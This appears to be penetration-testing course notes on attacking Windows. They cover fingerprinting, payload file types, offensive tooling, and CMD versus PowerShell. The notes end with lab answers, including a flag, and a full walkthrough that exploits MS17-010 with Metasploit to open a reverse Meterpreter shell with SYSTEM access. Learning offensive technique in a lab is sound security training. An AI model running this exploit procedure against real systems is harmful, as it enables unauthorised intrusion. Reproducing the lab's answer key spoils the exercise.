# Infiltrating Windows
## Enumerating Windows & Fingerprinting Methods
- A typical response from a Windows host will either have TTL equals to `32` or `128`.
- Use nmap: `sudo nmap -v -O <ip>` or `sudo nmap -A -Pn <ip>`
- Banner grab to enumerate ports: `sudo nmap -v <ip> --script banner.nse` 

## Payload Types to Consider
- **DLLs**: A Dynamic Linking Library (DLL) is a library file used in Microsoft operating systems to provide shared code and data that can be used by many different programs at once. These files are modular and allow us to have applications that are more dynamic and easier to update. As a pentester, injecting a malicious DLL or hijacking a vulnerable library on the host can elevate our privileges to SYSTEM and/or bypass User Account Controls.

- **Batch**: Batch files are text-based DOS scripts utilized by system administrators to complete multiple tasks through the command-line interpreter. These files end with an extension of `.bat`. We can use batch files to run commands on the host in an automated fashion. For example, we can have a batch file open a port on the host, or connect back to our attacking box. Once that is done, it can then perform basic enumeration steps and feed us info back over the open port.

- **VBS**: VBScript is a lightweight scripting language based on Microsoft's Visual Basic. It is typically used as a client-side scripting language in webservers to enable dynamic web pages. VBS is dated and disabled by most modern web browsers but lives on in the context of Phishing and other attacks aimed at having users perform an action such as enabling the loading of Macros in an excel document or clicking on a cell to have the Windows scripting engine execute a piece of code.

- **MSI**: .MSI files serve as an installation database for the Windows Installer. When attempting to install a new application, the installer will look for the .msi file to understand all of the components required and how to find them. We can use the Windows Installer by crafting a payload as an `.msi` file. Once we have it on the host, we can run `msiexec` to execute our file, which will provide us with further access, such as an elevated reverse shell.

- **Powershell**: Powershell is both a shell environment and scripting language. It serves as Microsoft's modern shell environment in their operating systems. As a scripting language, it is a dynamic language based on the .NET Common Language Runtime that, like its shell component, takes input and output as .NET objects. PowerShell can provide us with a plethora of options when it comes to gaining a shell and execution on a host, among many other steps in our penetration testing process.

## Payload Generation
|Resource|Description|
|-|-|
|`MSFVenom & Metasploit-Framework`|MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host.|
|`Payloads All The Things`|[Source](https://github.com/swisskyrepo/PayloadsAllTheThings) Here, you can find many different resources and cheat sheets for payload generation and general methodology.|
|`Mythic C2 Framework`|[Source](https://github.com/its-a-feature/Mythic) The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation.|
|`Nishang`|[Source](https://github.com/samratashok/nishang) Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester.|
|`Darkarmour`|[Source](https://github.com/bats3c/darkarmour) Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts.|

## CMD-Prompt and Power[Shell]s for Fun and Profit.
Use CMD when:
- You are on an older host that may not include PowerShell.
- When you only require simple interactions/access to the host.
- When you plan to use simple batch files, net commands, or MS-DOS native tools.
- When you believe that execution policies may affect your ability to run scripts or other actions on the host.

Use PowerShell when:
- You are planning to utilize cmdlets or other custom-built scripts.
- When you wish to interact with .NET objects instead of text output.
- When being stealthy is of lesser concern.
- If you are planning to interact with cloud-based services and hosts.
- If your scripts set and use Aliases.

## Question
1. What file type is a text-based DOS script used to perform tasks from the cli? (answer with the file extension, e.g. '.something') **Answer: .bat**
2. What Windows exploit was dropped as a part of the Shadow Brokers leak? (Format: ms bulletin number, e.g. MSxx-xxx) **Answer: MS17-010**
3. Gain a shell on the vulnerable target, then submit the contents of the flag.txt file that can be found in C:\ **Answer: EB-Still-W0rk$**
    - Start a nmap scan and detect vulnerable SMB version:
        ```
        $ sudo nmap -sV -O 10.129.96.46
        Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-24 10:59 +07
        Nmap scan report for 10.129.96.46
        Host is up (0.35s latency).
        Not shown: 995 closed tcp ports (reset)
        PORT     STATE SERVICE      VERSION
        80/tcp   open  http         Microsoft IIS httpd 10.0
        135/tcp  open  msrpc        Microsoft Windows RPC
        139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
        445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
        5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
        ```
    - Use `msfconsole` with `windows/smb/ms17_010_psexec` module to exploit (set `SHARE` → `C$`):
        ```
        msf > use windows/smb/ms17_010_psexec
        msf exploit(windows/smb/ms17_010_psexec) >> set RHOSTS 10.129.96.46
        RHOSTS => 10.129.96.46
        msf exploit(windows/smb/ms17_010_psexec) >> set SHARE C$
        SHARE => C$
        msf exploit(windows/smb/ms17_010_psexec) >> set LHOST 10.10.14.147
        LHOST => 10.10.14.147
        msf exploit(windows/smb/ms17_010_psexec) >> exploit
        [*] Started reverse TCP handler on 10.10.14.147:4444 
        [*] 10.129.96.46:445 - Target OS: Windows Server 2016 Standard 14393
        [*] 10.129.96.46:445 - Built a write-what-where primitive...
        [+] 10.129.96.46:445 - Overwrite complete... SYSTEM session obtained!
        [*] 10.129.96.46:445 - Selecting PowerShell target
        [*] 10.129.96.46:445 - Executing the payload...
        [+] 10.129.96.46:445 - Service start timed out, OK if running a command or non-service executable...
        [*] Sending stage (177734 bytes) to 10.129.96.46
        [*] Meterpreter session 1 opened (10.10.14.147:4444 -> 10.129.96.46:49675) at 2025-09-23 23:24:25 -0500

        (Meterpreter 1)(C:\Windows\system32) > cd ../../
        (Meterpreter 1)(C:\) > dir
        Listing: C:\
        ============

        Mode              Size    Type  Last modified              Name
        ----              ----    ----  -------------              ----
        040777/rwxrwxrwx  0       dir   2020-10-05 18:18:31 -0500  $Recycle.Bin
        100666/rw-rw-rw-  1       fil   2016-07-16 08:18:08 -0500  BOOTNXT
        040777/rwxrwxrwx  0       dir   2020-10-02 19:22:46 -0500  Documents and Settings
        040777/rwxrwxrwx  0       dir   2016-07-16 08:23:21 -0500  PerfLogs
        040555/r-xr-xr-x  4096    dir   2020-10-05 20:51:03 -0500  Program Files
        040777/rwxrwxrwx  4096    dir   2020-10-05 20:51:03 -0500  Program Files (x86)
        040777/rwxrwxrwx  4096    dir   2020-10-02 12:28:44 -0500  ProgramData
        040777/rwxrwxrwx  0       dir   2020-10-02 19:22:47 -0500  Recovery
        040777/rwxrwxrwx  4096    dir   2021-09-23 10:39:44 -0500  System Volume Information
        040555/r-xr-xr-x  4096    dir   2020-10-05 20:51:25 -0500  Users
        040777/rwxrwxrwx  24576   dir   2021-10-19 16:43:11 -0500  Windows
        100444/r--r--r--  389408  fil   2016-11-20 18:42:45 -0600  bootmgr
        100666/rw-rw-rw-  14      fil   2021-10-18 15:52:34 -0500  flag.txt
        040777/rwxrwxrwx  4096    dir   2021-10-18 15:51:10 -0500  inetpub
        000000/---------  0       fif   1969-12-31 18:00:00 -0600  pagefile.sys

        (Meterpreter 1)(C:\) > cat flag.txt
        EB-Still-W0rk$
        ```